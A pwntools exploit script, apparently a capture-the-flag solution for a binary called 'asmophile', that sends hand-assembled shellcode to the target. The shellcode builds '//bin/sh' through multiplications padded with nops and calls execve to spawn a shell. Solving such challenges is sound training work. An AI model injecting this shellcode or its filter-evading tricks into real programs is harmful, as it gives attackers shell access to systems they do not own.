#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './asmophile')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

context.terminal = ["kitty"]
gdbscript = '''
#tbreak main
b *main+593
b *main+355
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

shellcode = """
/* Set registers to 0 */
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

/* Build the stack with //bin/sh */
mov bl, 16 /* This register will hold the value 16 for shifting bytes */
/* First null bytes */
push rcx
nop
/* Then n/sh (ie bytes 110, 47, 115, 104) */
mov al, 104
mul ebx
mul ebx
mov al, 115
mul ebx
mul ebx
mov al, 47
mul ebx
mul ebx
mov al, 110
mul ebx
mul ebx
mov al, 105
mul ebx
mul ebx
mov al, 98
mul ebx
mul ebx
mov al, 47
mul ebx
mul ebx
mov al, 47
push rax
nop

/* syscall */
xor eax, eax
mov al, 59
push rsp
nop
pop rdi
nop
syscall

/* exit */
mov al,1
xor ebx, ebx
syscall
"""
sh = asm(shellcode)
io.send(sh)

io.interactive()

